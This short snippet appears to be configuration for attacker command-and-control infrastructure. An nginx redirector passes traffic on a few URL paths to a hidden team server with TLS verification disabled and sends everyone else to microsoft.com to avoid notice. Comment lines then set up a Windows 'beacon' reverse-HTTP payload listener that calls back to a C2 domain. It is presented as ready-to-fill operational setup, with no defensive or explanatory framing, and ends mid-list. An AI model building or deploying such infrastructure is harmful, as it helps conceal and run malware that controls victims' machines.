commands.command:
server {
  listen 443 ssl;
  server_name {redirector_domain};
  ssl_certificate /etc/letsencrypt/live/{domain}/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/{domain}/privkey.pem;

  location ~ ^/(submit|update|cdn) {
    proxy_pass https://{real_ts_ip}:443;
    proxy_ssl_verify off;
  }
  location / { return 302 https://microsoft.com; }
}

# Listeners → Add
# Payload: windows/beacon_http/reverse_http
# HTTP Hosts: {c2_domain}
# HTTP Port: 80
# HTTP Host (Stager): {c2_domain}

# Listeners → Add
